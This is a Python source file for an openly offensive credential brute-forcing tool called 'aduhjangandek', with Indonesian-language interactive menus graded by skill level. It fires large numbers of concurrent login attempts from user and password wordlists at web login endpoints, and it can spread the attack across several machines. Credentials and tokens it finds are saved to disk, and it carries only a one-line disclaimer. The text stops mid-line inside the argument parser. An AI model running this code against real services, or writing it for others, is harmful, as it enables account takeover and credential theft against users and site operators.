#!/usr/bin/env python3
"""
aduhjangandek v2.1 - Advanced Bruteforce Engine (Interactive Edition)
Features:
- Interactive mode dengan tingkatan skill (script kiddie sampai advanced)
- Smart queue system: thread selesai langsung ambil task baru
- Dynamic payload templates dengan placeholder variables
- Auto-parse dari raw HTTP request (à la sqlmap)
- Support custom JSON/form/XML payloads
- Multi endpoint support dengan rate limiting per-host
- WSL & Linux compatible
"""

import argparse, os, sys, json, time, queue, fcntl, re
from functools import partial
from collections import deque, defaultdict
from urllib.parse import urlparse, parse_qs, urlencode

# optional tqdm
try:
    from tqdm import tqdm
    TQDM = True
except Exception:
    TQDM = False

# async libs
try:
    import asyncio, aiohttp, aiofiles
    ASYNC_AVAILABLE = True
except Exception:
    ASYNC_AVAILABLE = False

# threads libs
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading
    THREADS_AVAILABLE = True
except Exception:
    THREADS_AVAILABLE = False

def now_ts():
    return time.strftime("%H:%M:%S")

def ensure_dir(d):
    os.makedirs(d, exist_ok=True)

def read_file_lines(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s:
                yield s

def save_success_sync(save_dir, user, password, text, target_info=""):
    safe_target = re.sub(r'[^\w\-_]', '_', target_info[:30])
    fname = os.path.join(save_dir, f"resp_{safe_target}_{user}_{password}.json")
    with open(fname, "w", encoding="utf-8") as f:
        f.write(text)
    token = None
    try:
        j = json.loads(text)
        token = j.get("token") or j.get("access_token") or j.get("Token") or j.get("jwt") or j.get("sessionId")
    except Exception:
        token = None
    csv_path = os.path.join(save_dir, "hasils.csv")
    with open(csv_path, "a", encoding="utf-8", newline='') as cf:
        cf.write(f"{user},{password},{fname},{target_info}\n")
    return token, fname

def apply_shard_users(users, shards, shard_index):
    if shards is None or shards <= 1:
        return users
    return [u for i,u in enumerate(users) if (i % shards) == shard_index]

def split_list(lst, n):
    if n <= 0:
        return [lst]
    k, m = divmod(len(lst), n)
    chunks = [lst[i*k+min(i,m):(i+1)*k+min(i+1,m)] for i in range(n)]
    while len(chunks) < n:
        chunks.append([])
    return chunks

# --------------------
# Interactive Mode Functions
# --------------------
def print_banner():
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║         🔥  aduhjangandek v2.1  🔥                        ║
║                                                           ║
║     "When your GitHub needs more than fork repos"        ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """
    print("\033[1;36m" + banner + "\033[0m")

def show_difficulty_menu():
    menu = """
\033[1;33m╔══════════════════════════════════════════════════════════╗
║              Choose Your Fighter! 🎮                      ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [1] 👶 Script Kiddie Mode                               ║
║      └─ "Mommy said hacking is easy!"                    ║
║      └─ Auto settings, single target, basic payload      ║
║      └─ Perfect for: yang baru keluar dari tutorial      ║
║                                                          ║
║  [2] 😎 Simple Mode                                      ║
║      └─ "I know what I'm doing... kinda"                 ║
║      └─ Custom payload, single/multi user                ║
║      └─ Perfect for: yang udah pernah liat Burp Suite    ║
║                                                          ║
║  [3] 🎯 Medium Mode                                      ║
║      └─ "Been there, done that, got the t-shirt"        ║
║      └─ Multi-target, custom headers, rate limiting      ║
║      └─ Perfect for: yang udah pernah dapet bounty       ║
║                                                          ║
║  [4] 😈 Advanced Mode                                    ║
║      └─ "I compile my own kernel for breakfast"          ║
║      └─ Full control, distributed attack, custom engine  ║
║      └─ Perfect for: yang baca docs buat fun             ║
║                                                          ║
║  [5] 🤖 CLI Mode (Classic)                               ║
║      └─ "GUIs are for n00bs"                            ║
║      └─ Direct argument parsing, scriptable              ║
║      └─ Perfect for: automation & scripts                ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝\033[0m
"""
    print(menu)

def get_input(prompt, default=None, validator=None):
    """Helper untuk input dengan default value"""
    if default:
        prompt = f"{prompt} [{default}]: "
    else:
        prompt = f"{prompt}: "
    
    while True:
        value = input(prompt).strip()
        if not value and default:
            return default
        if not value:
            print("\033[1;31m❌ Input tidak boleh kosong!\033[0m")
            continue
        if validator and not validator(value):
            print("\033[1;31m❌ Input tidak valid!\033[0m")
            continue
        return value

def file_exists(path):
    """Validator untuk file existence"""
    if os.path.exists(path):
        return True
    print(f"\033[1;31m❌ File tidak ditemukan: {path}\033[0m")
    return False

def is_valid_url(url):
    """Validator untuk URL"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        print("\033[1;31m❌ URL tidak valid!\033[0m")
        return False

def script_kiddie_mode():
    """Mode paling basic - untuk yang baru belajar 😂"""
    print("\n\033[1;35m" + "="*60)
    print("👶 SCRIPT KIDDIE MODE ACTIVATED")
    print("   (Jangan malu, semua orang pernah di fase ini)")
    print("="*60 + "\033[0m\n")
    
    print("\033[1;33m💡 Tips: Ini mode auto-pilot, tinggal isi yang penting aja!\033[0m\n")
    
    # Basic inputs
    target = get_input("🎯 Target URL (contoh: https://api.target.com/login)", validator=is_valid_url)
    username = get_input("👤 Username target")
    
    # Password list dengan default rockyou
    default_rockyou = "/usr/share/wordlists/rockyou.txt"
    has_rockyou = os.path.exists(default_rockyou)
    
    if has_rockyou:
        use_rockyou = get_input(f"🔑 Pakai rockyou.txt? (y/n)", default="y")
        if use_rockyou.lower() in ['y', 'yes']:
            passfile = default_rockyou
        else:
            passfile = get_input("🔑 Password file", validator=file_exists)
    else:
        print("\033[1;33m⚠️  rockyou.txt tidak ditemukan di /usr/share/wordlists/\033[0m")
        passfile = get_input("🔑 Password file", validator=file_exists)
    
    print("\n\033[1;32m✨ Auto-configuring optimal settings...\033[0m")
    time.sleep(1)
    
    config = {
        'target': target,
        'user': username,
        'pass_file': passfile,
        'concurrency': 10,
        'timeout': 15,
        'delay': 0.2,
        'mode': 'single',
        'engine': 'async',
        'payload': None,
        'content_type': 'application/json',
        'method': 'POST',
        'check_substring': '"message":"200"',
        'save_dir': 'found_responses',
        'dist_mode': 'user-round'
    }
    
    print("\n\033[1;36m" + "="*60)
    print("📋 Configuration Summary:")
    print("="*60 + "\033[0m")
    print(f"  Target:      {target}")
    print(f"  Username:    {username}")
    print(f"  Wordlist:    {passfile}")
    print(f"  Workers:     10 (safe mode)")
    print(f"  Delay:       0.2s (polite mode)")
    print(f"  Engine:      Async (fast mode)")
    print("\n\033[1;33m💀 Disclaimer: Jangan nyerang yang bukan punya lo ya!\033[0m\n")
    
    confirm = get_input("🚀 Lanjutkan? (y/n)", default="y")
    if confirm.lower() not in ['y', 'yes']:
        print("\033[1;31m❌ Dibatalin. Mungkin lain kali ya!\033[0m")
        sys.exit(0)
    
    return config

def simple_mode():
    """Mode simple - sudah paham basic tapi belum expert"""
    print("\n\033[1;35m" + "="*60)
    print("😎 SIMPLE MODE ACTIVATED")
    print("   (Lumayan, udah mulai paham nih)")
    print("="*60 + "\033[0m\n")
    
    target = get_input("🎯 Target URL", validator=is_valid_url)
    
    # Single or multi user
    print("\n\033[1;33m👥 User Configuration:\033[0m")
    print("  [1] Single user")
    print("  [2] Multiple users (from file)")
    user_choice = get_input("Pilih", default="1")
    
    if user_choice == "1":
        user = get_input("👤 Username")
        users_file = None
        mode = 'single'
    else:
        users_file = get_input("📄 Users file", validator=file_exists)
        user = None
        mode = 'cartesian'
    
    passfile = get_input("🔑 Password file", validator=file_exists)
    
    # Custom payload
    print("\n\033[1;33m📦 Payload Configuration:\033[0m")
    custom_payload = get_input("Custom payload? (y/n)", default="n")
    
    if custom_payload.lower() in ['y', 'yes']:
        print("\n\033[1;36m💡 Placeholder yang available:\033[0m")
        print("   {USER} atau {USERNAME} → username")
        print("   {PASS} atau {PASSWORD} → password")
        print("   {EMAIL} → auto-generate email\n")
        payload = get_input('Payload (contoh: {"email":"{EMAIL}","pwd":"{PASS}"})')
        content_type = get_input("Content-Type", default="application/json")
    else:
        payload = None
        content_type = "application/json"
    
    # Performance settings
    print("\n\033[1;33m⚡ Performance Settings:\033[0m")
    concurrency = int(get_input("Concurrent workers", default="20"))
    delay = float(get_input("Delay per request (seconds)", default="0.1"))
    
    config = {
        'target': target,
        'user': user,
        'users_file': users_file,
        'pass_file': passfile,
        'concurrency': concurrency,
        'timeout': 15,
        'delay': delay,
        'mode': mode,
        'engine': 'async',
        'payload': payload,
        'content_type': content_type,
        'method': 'POST',
        'check_substring': '"message":"200"',
        'save_dir': 'found_responses',
        'dist_mode': 'user-round'
    }
    
    print("\n\033[1;32m✅ Configuration complete!\033[0m")
    return config

def medium_mode():
    """Mode medium - untuk yang udah pengalaman"""
    print("\n\033[1;35m" + "="*60)
    print("🎯 MEDIUM MODE ACTIVATED")
    print("   (Oke, udah pro nih kayaknya)")
    print("="*60 + "\033[0m\n")
    
    # Target selection
    print("\033[1;33m🎯 Target Configuration:\033[0m")
    print("  [1] Single target")
    print("  [2] Multiple targets from file")
    print("  [3] From raw HTTP request (SQLMap style)")
    target_choice = get_input("Pilih", default="1")
    
    target = None
    targets_file = None
    request_file = None
    
    if target_choice == "1":
        target = get_input("Target URL", validator=is_valid_url)
    elif target_choice == "2":
        targets_file = get_input("Targets file", validator=file_exists)
    else:
        request_file = get_input("Raw HTTP request file", validator=file_exists)
    
    # Users
    print("\n\033[1;33m👥 User Configuration:\033[0m")
    print("  [1] Single user")
    print("  [2] Multiple users")
    user_choice = get_input("Pilih", default="2")
    
    if user_choice == "1":
        user = get_input("Username")
        users_file = None
        mode = 'single'
    else:
        users_file = get_input("Users file", validator=file_exists)
        user = None
        mode = 'cartesian'
    
    passfile = get_input("🔑 Password file", validator=file_exists)
    
    # Payload & method
    print("\n\033[1;33m📦 Request Configuration:\033[0m")
    method = get_input("HTTP Method", default="POST")
    
    if not request_file:
        custom_payload = get_input("Custom payload? (y/n)", default="n")
        if custom_payload.lower() in ['y', 'yes']:
            payload = get_input("Payload template")
            content_type = get_input("Content-Type", default="application/json")
        else:
            payload = None
            content_type = "application/json"
    else:
        payload = None
        content_type = None
    
    # Advanced settings
    print("\n\033[1;33m⚙️  Advanced Settings:\033[0m")
    concurrency = int(get_input("Concurrent workers", default="50"))
    delay = float(get_input("Delay per request", default="0.05"))
    timeout = int(get_input("Request timeout", default="15"))
    
    print("\n\033[1;33m🎲 Distribution Mode:\033[0m")
    print("  [1] user-round (default)")
    print("  [2] user-chunk")
    print("  [3] user-queue (multi-process safe)")
    dist_choice = get_input("Pilih", default="1")
    dist_modes = {'1': 'user-round', '2': 'user-chunk', '3': 'user-queue'}
    dist_mode = dist_modes.get(dist_choice, 'user-round')
    
    # Success detection
    check_substring = get_input("Success detection substring", default='"message":"200"')
    
    config = {
        'target': target,
        'targets_file': targets_file,
        'request': request_file,
        'user': user,
        'users_file': users_file,
        'pass_file': passfile,
        'concurrency': concurrency,
        'timeout': timeout,
        'delay': delay,
        'mode': mode,
        'engine': 'async',
        'payload': payload,
        'content_type': content_type,
        'method': method,
        'check_substring': check_substring,
        'save_dir': 'found_responses',
        'dist_mode': dist_mode
    }
    
    print("\n\033[1;32m✅ Configuration complete!\033[0m")
    return config

def advanced_mode():
    """Mode advanced - full control"""
    print("\n\033[1;35m" + "="*60)
    print("😈 ADVANCED MODE ACTIVATED")
    print("   (Wah, ketemu expert nih. Respect! 🫡)")
    print("="*60 + "\033[0m\n")
    
    print("\033[1;33m📝 Advanced mode memberikan full control.\033[0m")
    print("\033[1;33m   Semua opsi akan ditanyakan.\033[0m\n")
    
    # Target
    print("\033[1;36m[1/10] Target Configuration\033[0m")
    print("  [1] Single target URL")
    print("  [2] Multiple targets file")
    print("  [3] Raw HTTP request file (SQLMap style)")
    target_choice = get_input("Select", default="1")
    
    target = targets_file = request_file = None
    if target_choice == "1":
        target = get_input("Target URL", validator=is_valid_url)
    elif target_choice == "2":
        targets_file = get_input("Targets file", validator=file_exists)
    else:
        request_file = get_input("Request file", validator=file_exists)
    
    # Users
    print("\n\033[1;36m[2/10] Credentials Configuration\033[0m")
    print("  [1] Single user")
    print("  [2] Multiple users file")
    user_choice = get_input("Select", default="2")
    
    user = users_file = None
    if user_choice == "1":
        user = get_input("Username")
        mode = 'single'
    else:
        users_file = get_input("Users file", validator=file_exists)
        mode = 'cartesian'
    
    passfile = get_input("Password file", validator=file_exists)
    
    # Payload
    print("\n\033[1;36m[3/10] Payload Configuration\033[0m")
    method = get_input("HTTP Method", default="POST")
    
    if not request_file:
        payload = get_input("Payload template (leave empty for default)", default="")
        payload = payload if payload else None
        if payload:
            content_type = get_input("Content-Type", default="application/json")
        else:
            content_type = "application/json"
    else:
        payload = content_type = None
    
    # Engine
    print("\n\033[1;36m[4/10] Execution Engine\033[0m")
    print("  [1] async (faster, I/O bound)")
    print("  [2] threads (stable, CPU bound)")
    engine_choice = get_input("Select", default="1")
    engine = 'async' if engine_choice == "1" else 'threads'
    
    # Performance
    print("\n\033[1;36m[5/10] Performance Tuning\033[0m")
    concurrency = int(get_input("Concurrent workers", default="100"))
    timeout = int(get_input("Request timeout (seconds)", default="15"))
    delay = float(get_input("Delay per request (seconds)", default="0"))
    
    # Distribution
    print("\n\033[1;36m[6/10] Distribution Strategy\033[0m")
    print("  [1] user-round (round-robin)")
    print("  [2] user-chunk (split chunks)")
    print("  [3] user-queue (atomic queue, multi-process safe)")
    print("  [4] pass-interleave (password interleaving)")
    dist_choice = get_input("Select", default="3")
    dist_modes = {'1': 'user-round', '2': 'user-chunk', '3': 'user-queue', '4': 'pass-interleave'}
    dist_mode = dist_modes.get(dist_choice, 'user-queue')
    
    # Sharding
    print("\n\033[1;36m[7/10] Distributed Attack (Sharding)\033[0m")
    use_sharding = get_input("Enable sharding? (y/n)", default="n")
    shards = shard_index = 1, 0
    if use_sharding.lower() in ['y', 'yes']:
        shards = int(get_input("Total shards", default="1"))
        shard_index = int(get_input("This shard index (0-based)", default="0"))
    else:
        shards, shard_index = 1, 0
    
    # Success detection
    print("\n\033[1;36m[8/10] Success Detection\033[0m")
    check_substring = get_input("Success substring", default='"message":"200"')
    
    # Global stop flag
    print("\n\033[1;36m[9/10] Coordination\033[0m")
    global_flag = get_input("Global stop flag path", default="/tmp/aduhjangandek_done.flag")
    
    # Output
    print("\n\033[1;36m[10/10] Output Configuration\033[0m")
    save_dir = get_input("Save directory", default="found_responses")
    
    config = {
        'target': target,
        'targets_file': targets_file,
        'request': request_file,
        'user': user,
        'users_file': users_file,
        'pass_file': passfile,
        'concurrency': concurrency,
        'timeout': timeout,
        'delay': delay,
        'mode': mode,
        'engine': engine,
        'payload': payload,
        'content_type': content_type,
        'method': method,
        'check_substring': check_substring,
        'save_dir': save_dir,
        'dist_mode': dist_mode,
        'shards': shards,
        'shard_index': shard_index,
        'global_stop_flag': global_flag
    }
    
    print("\n\033[1;32m✅ Full configuration complete! Let's go! 🚀\033[0m")
    return config

def interactive_mode():
    """Main interactive mode handler"""
    print_banner()
    show_difficulty_menu()
    
    choice = get_input("Select difficulty [1-5]", default="1")
    
    if choice == "1":
        return script_kiddie_mode()
    elif choice == "2":
        return simple_mode()
    elif choice == "3":
        return medium_mode()
    elif choice == "4":
        return advanced_mode()
    elif choice == "5":
        print("\n\033[1;36m🤖 Switching to CLI mode...\033[0m")
        print("\033[1;33m💡 Use --help to see all available options\033[0m\n")
        return None
    else:
        print("\033[1;31m❌ Invalid choice!\033[0m")
        sys.exit(1)

# --------------------
# HTTP Request Parser (sqlmap-style)
# --------------------
def parse_raw_request(raw_request):
    """Parse raw HTTP request"""
    lines = raw_request.strip().split('\n')
    if not lines:
        raise ValueError("Empty request")
    
    first_line = lines[0].strip()
    parts = first_line.split()
    if len(parts) < 2:
        raise ValueError(f"Invalid request line: {first_line}")
    
    method = parts[0].upper()
    path = parts[1]
    
    headers = {}
    body_start = None
    
    for i, line in enumerate(lines[1:], 1):
        line = line.strip()
        if not line:
            body_start = i + 1
            break
        if ':' in line:
            key, val = line.split(':', 1)
            headers[key.strip()] = val.strip()
    
    body = ""
    if body_start and body_start < len(lines):
        body = '\n'.join(lines[body_start:]).strip()
    
    host = headers.get('Host', '')
    scheme = 'https' if '443' in host or 'ssl' in host.lower() else 'http'
    url = f"{scheme}://{host}{path}" if host else path
    
    return method, url, headers, body

# --------------------
# Payload Template Engine
# --------------------
class PayloadTemplate:
    def __init__(self, template, content_type="application/json"):
        self.template = template
        self.content_type = content_type.lower()
    
    def render(self, user, password):
        data = self.template
        email = user if '@' in user else f"{user}@example.com"
        
        replacements = {
            '{USER}': user,
            '{USERNAME}': user,
            '{PASS}': password,
            '{PASSWORD}': password,
            '{EMAIL}': email,
            '{PHONE}': user,
        }
        
        for placeholder, value in replacements.items():
            data = data.replace(placeholder, value)
        
        return data
    
    def render_dict(self, user, password):
        rendered = self.render(user, password)
        if 'json' in self.content_type:
            try:
                return json.loads(rendered)
            except:
                pass
        return rendered

# --------------------
# File-queue helpers (atomic pop)
# --------------------
def pop_user_from_file_atomic(path):
    try:
        with open(path, "r+") as fh:
            fcntl.flock(fh, fcntl.LOCK_EX)
            try:
                fh.seek(0)
                lines = fh.readlines()
                if not lines:
                    return None
                user = lines[0].strip()
                fh.seek(0)
                fh.truncate(0)
                fh.writelines(lines[1:])
                return user
            finally:
                fcntl.flock(fh, fcntl.LOCK_UN)
    except FileNotFoundError:
        return None
    except Exception:
        return None

# --------------------
# ASYNC engine helpers
# --------------------
async def async_request(session, method, url, user, password, headers, payload_template, timeout_obj, sem, save_dir, check_substring, delay, global_flag_path, found_flag, target_info):
    if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
        return None
    
    async with sem:
        try:
            if payload_template:
                rendered = payload_template.render(user, password)
                if 'json' in payload_template.content_type:
                    data_kwargs = {'json': json.loads(rendered)}
                else:
                    data_kwargs = {'data': rendered}
            else:
                data_kwargs = {'json': {"userName": user, "password": password}}
            
            async with session.request(method, url, headers=headers, timeout=timeout_obj, **data_kwargs) as resp:
                text = await resp.text()
                
                if delay:
                    await asyncio.sleep(delay)
                
                if check_substring in text or resp.status == 200:
                    token, fname = save_success_sync(save_dir, user, password, text, target_info)
                    if global_flag_path:
                        try:
                            with open(global_flag_path, "w", encoding="utf-8") as ff:
                                ff.write(f"{user},{password},{time.time()}\n")
                        except Exception:
                            pass
                    found_flag.set()
                    return (user, password, token, fname, text)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            return None
    return None

async def async_worker_queue(worker_id, task_queue, session, method, target, headers, payload_template, timeout_obj, sem, save_dir, check_substring, delay, pbar, found_flag, global_flag_path, results_list, single_mode, target_info):
    while True:
        if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
            break
        try:
            user, password = task_queue.get_nowait()
        except asyncio.QueueEmpty:
            break

        result = await async_request(session, method, target, user, password, headers, payload_template, timeout_obj, sem, save_dir, check_substring, delay, global_flag_path, found_flag, target_info)

        if pbar:
            pbar.update(1)

        if result:
            results_list.append(result)
            if single_mode:
                found_flag.set()
                break

async def run_async_queue_based(method, target, users, passes, headers, payload_template, concurrency, timeout, save_dir, check_substring, delay, pbar, global_flag_path, single_mode, target_info):
    sem = asyncio.Semaphore(concurrency)
    timeout_obj = aiohttp.ClientTimeout(total=timeout)
    found_flag = asyncio.Event()
    results_list = []

    task_queue = asyncio.Queue()

    for u in users:
        if found_flag.is_set():
            break
        for p in passes:
            await task_queue.put((u, p))

    async with aiohttp.ClientSession(timeout=timeout_obj) as session:
        workers = [
            asyncio.create_task(
                async_worker_queue(
                    i, task_queue, session, method, target, headers, payload_template, timeout_obj, sem,
                    save_dir, check_substring, delay, pbar, found_flag,
                    global_flag_path, results_list, single_mode, target_info
                )
            )
            for i in range(concurrency)
        ]
        await asyncio.gather(*workers, return_exceptions=True)

    return results_list

async def run_async_user_queue(method, target, users_queue_path, passes, headers, payload_template, concurrency, timeout, save_dir, check_substring, delay, pbar, global_flag_path, target_info):
    sem = asyncio.Semaphore(concurrency)
    timeout_obj = aiohttp.ClientTimeout(total=timeout)
    found_flag = asyncio.Event()
    results_list = []

    async with aiohttp.ClientSession(timeout=timeout_obj) as session:
        tasks = []
        while True:
            if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
                break
            
            user = pop_user_from_file_atomic(users_queue_path)
            if user is None:
                break
            
            for p in passes:
                task = asyncio.create_task(
                    async_request(session, method, target, user, p, headers, payload_template, 
                                timeout_obj, sem, save_dir, check_substring, delay, 
                                global_flag_path, found_flag, target_info)
                )
                tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                results_list.append(r)
                if pbar:
                    pbar.update(1)
    
    return results_list

# --------------------
# THREADS engine helpers
# --------------------
def thread_request(method, url, user, password, headers, payload_template, timeout, save_dir, check_substring, delay, global_flag_path, found_flag, target_info):
    if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
        return None
    
    try:
        if payload_template:
            rendered = payload_template.render(user, password)
            if 'json' in payload_template.content_type:
                resp = requests.request(method, url, headers=headers, json=json.loads(rendered), timeout=timeout)
            else:
                resp = requests.request(method, url, headers=headers, data=rendered, timeout=timeout)
        else:
            resp = requests.request(method, url, headers=headers, json={"userName": user, "password": password}, timeout=timeout)
        
        text = resp.text
        
        if delay:
            time.sleep(delay)
        
        if check_substring in text or resp.status_code == 200:
            token, fname = save_success_sync(save_dir, user, password, text, target_info)
            if global_flag_path:
                try:
                    with open(global_flag_path, "w", encoding="utf-8") as ff:
                        ff.write(f"{user},{password},{time.time()}\n")
                except Exception:
                    pass
            found_flag.set()
            return (user, password, token, fname, text)
    except Exception as e:
        return None
    return None

def run_threads_queue_based(method, target, users, passes, headers, payload_template, concurrency, timeout, save_dir, check_substring, delay, pbar, global_flag_path, single_mode, target_info):
    found_flag = threading.Event()
    results_list = []
    lock = threading.Lock()
    
    task_queue = queue.Queue()
    for u in users:
        for p in passes:
            task_queue.put((u, p))
    
    def worker():
        while True:
            if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
                break
            try:
                user, password = task_queue.get_nowait()
            except queue.Empty:
                break
            
            result = thread_request(method, target, user, password, headers, payload_template, 
                                  timeout, save_dir, check_substring, delay, 
                                  global_flag_path, found_flag, target_info)
            
            if pbar:
                pbar.update(1)
            
            if result:
                with lock:
                    results_list.append(result)
                if single_mode:
                    found_flag.set()
                    break
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(worker) for _ in range(concurrency)]
        for f in as_completed(futures):
            pass
    
    return results_list

# --------------------
# Main orchestrator
# --------------------
def main():
    # Check if running in interactive mode (no CLI args)
    if len(sys.argv) == 1:
        config = interactive_mode()
        if config is None:
            # User selected CLI mode, show help
            parser = build_parser()
            parser.print_help()
            sys.exit(0)
    else:
        # Parse CLI arguments
        parser = build_parser()
        args = parser.parse_args()
        config = vars(args)
    
    # Extract config
    target = config.get('target')
    targets_file = config.get('targets_file')
    request_file = config.get('request')
    user = config.get('user')
    users_file = config.get('users_file')
    pass_file = config.get('pass_file')
    concurrency = config.get('concurrency', 20)
    timeout = config.get('timeout', 15)
    delay = config.get('delay', 0)
    mode = config.get('mode', 'cartesian')
    engine = config.get('engine', 'async')
    payload_template_str = config.get('payload')
    content_type = config.get('content_type', 'application/json')
    method = config.get('method', 'POST')
    check_substring = config.get('check_substring', '"message":"200"')
    save_dir = config.get('save_dir', 'found_responses')
    dist_mode = config.get('dist_mode', 'user-round')
    shards = config.get('shards', 1)
    shard_index = config.get('shard_index', 0)
    global_stop_flag = config.get('global_stop_flag')
    
    ensure_dir(save_dir)
    
    # Load passwords
    passwords = list(read_file_lines(pass_file))
    print(f"\n[{now_ts()}] 🔑 Loaded {len(passwords)} passwords from {pass_file}")
    
    # Determine targets
    targets = []
    if target:
        targets.append(target)
    elif targets_file:
        targets = list(read_file_lines(targets_file))
        print(f"[{now_ts()}] 🎯 Loaded {len(targets)} targets from {targets_file}")
    elif request_file:
        with open(request_file, 'r', encoding='utf-8') as rf:
            raw_req = rf.read()
        method, url, headers, body = parse_raw_request(raw_req)
        targets.append(url)
        print(f"[{now_ts()}] 📄 Parsed request: {method} {url}")
        if payload_template_str is None and body:
            payload_template_str = body
            content_type = headers.get('Content-Type', 'application/json')
    else:
        print("\033[1;31m❌ No target specified!\033[0m")
        sys.exit(1)
    
    # Setup payload template
    payload_template = None
    if payload_template_str:
        payload_template = PayloadTemplate(payload_template_str, content_type)
        print(f"[{now_ts()}] 📦 Using custom payload template")
    
    # Determine users
    users = []
    if mode == 'single' and user:
        users = [user]
        print(f"[{now_ts()}] 👤 Single user mode: {user}")
    elif users_file:
        users = list(read_file_lines(users_file))
        print(f"[{now_ts()}] 👥 Loaded {len(users)} users from {users_file}")
    
    # Apply sharding
    if shards > 1:
        users = apply_shard_users(users, shards, shard_index)
        print(f"[{now_ts()}] 🔀 Sharding: {len(users)} users for shard {shard_index}/{shards}")
    
    # Calculate total attempts
    total_attempts = len(users) * len(passwords) * len(targets)
    print(f"[{now_ts()}] 🎲 Total attempts: {total_attempts:,}")
    print(f"[{now_ts()}] ⚡ Engine: {engine}, Workers: {concurrency}, Delay: {delay}s")
    print(f"[{now_ts()}] 🎯 Distribution mode: {dist_mode}")
    
    # Progress bar
    pbar = None
    if TQDM:
        pbar = tqdm(total=total_attempts, desc="Progress", unit="req")
    
    # Run attack for each target
    all_results = []
    
    for tgt in targets:
        target_info = urlparse(tgt).netloc or tgt[:50]
        print(f"\n[{now_ts()}] 🚀 Starting attack on {target_info}")
        
        headers = {'Content-Type': content_type}
        single_mode = (mode == 'single')
        
        if engine == 'async' and ASYNC_AVAILABLE:
            if dist_mode == 'user-queue':
                # User queue mode - atomic file-based
                queue_file = f"/tmp/aduhjangandek_users_{shard_index}.txt"
                with open(queue_file, 'w', encoding='utf-8') as qf:
                    for u in users:
                        qf.write(f"{u}\n")
                
                results = asyncio.run(
                    run_async_user_queue(
                        method, tgt, queue_file, passwords, headers, payload_template,
                        concurrency, timeout, save_dir, check_substring, delay,
                        pbar, global_stop_flag, target_info
                    )
                )
            else:
                # Queue-based async
                results = asyncio.run(
                    run_async_queue_based(
                        method, tgt, users, passwords, headers, payload_template,
                        concurrency, timeout, save_dir, check_substring, delay,
                        pbar, global_stop_flag, single_mode, target_info
                    )
                )
        elif engine == 'threads' and THREADS_AVAILABLE:
            results = run_threads_queue_based(
                method, tgt, users, passwords, headers, payload_template,
                concurrency, timeout, save_dir, check_substring, delay,
                pbar, global_stop_flag, single_mode, target_info
            )
        else:
            print(f"\033[1;31m❌ Engine '{engine}' not available!\033[0m")
            sys.exit(1)
        
        all_results.extend(results)
        
        if results:
            print(f"\n[{now_ts()}] ✅ Found {len(results)} valid credentials for {target_info}!")
            for user, password, token, fname, text in results:
                print(f"  → {user}:{password}")
                if token:
                    print(f"    Token: {token[:50]}...")
        else:
            print(f"\n[{now_ts()}] ❌ No valid credentials found for {target_info}")
    
    if pbar:
        pbar.close()
    
    # Summary
    print(f"\n{'='*60}")
    print(f"🏁 Attack completed!")
    print(f"{'='*60}")
    print(f"📊 Total credentials found: {len(all_results)}")
    print(f"💾 Results saved to: {save_dir}/hasils.csv")
    print(f"{'='*60}\n")
    
    if all_results:
        sys.exit(0)
    else:
        sys.exit(1)

def build_parser():
    parser = argparse.ArgumentParser(
        description='aduhjangandek v2.1 - Advanced Bruteforce Engine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive mode (recommended for beginners)
  python3 aduhjangandek.py
  
  # Single user mode
  python3 aduhjangandek.py -t https://api.example.com/login -u admin -P passwords.txt
  
  # Multi-user cartesian mode
  python3 aduhjangandek.py -t https://api.example.com/login -U users.txt -P passwords.txt
  
  # From raw HTTP request
  python3 aduhjangandek.py -r request.txt -U users.txt -P passwords.txt
  
  # Multiple targets
  python3 aduhjangandek.py -T targets.txt -U users.txt -P passwords.txt
  
  # Custom payload with placeholders
  python3 aduhjangandek.py -t https://api.example.com/login -U users.txt -P passwords.txt \\
    --payload '{"email":"{EMAIL}","pwd":"{PASS}"}' --content-type application/json
  
  # Distributed attack (3 machines)
  # Machine 1: python3 aduhjangandek.py -t URL -U users.txt -P pass.txt --shards 3 --shard-index 0
  # Machine 2: python3 aduhjangandek.py -t URL -U users.txt -P pass.txt --shards 3 --shard-index 1
  # Machine 3: python3 aduhjangandek.py -t URL -U users.txt -P pass.txt --shards 3 --shard-index 2

Distribution Modes:
  - user-round: Round-robin distribution (default)
  - user-chunk: Split users into chunks per worker
  - user-queue: Atomic queue-based (multi-process safe)
  - pass-interleave: Password interleaving across users
        """
    )
    
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument('-t', '--target', help='Single target URL')
    target_group.add_argument('-T', '--targets-file', help='File containing multiple target URLs')
    target_group.add_argument('-r', '--request', help='Raw HTTP request file (SQLMap style)')
    
    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument('-u', '--user', help='Single username')
    user_group.add_argument('-U', '--users-file', help='File containing usernames')
    
    parser.add_argument('-P', '--pass-file', required=True, help='Password wordlist file')
    
    parser.add_argument('-c', '--concurrency', type=int, default=20, help='Number of concurrent workers (default: 20)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    
    parser.add_argument('-m', '--mode', choices=['single', 'cartesian'], default='cartesian',
                       help='Attack mode (default: cartesian)')
    parser.add_argument('-e', '--engine', choices=['async', 'threads'], default='async',
                       help='Execution engine (default: async)')
    
    parser.add_argument('--payload', help='Custom payload template with placeholders: {USER}, {PASS}, {EMAIL}')
    parser.add_argument('--content-type', default='application/json', help='Content-Type header (default: application/json)')
    parser.add_argument('--method', default='POST', help='HTTP method (default: POST)')
    
    parser.add_argument('--check-substring', default='"message":"200"',
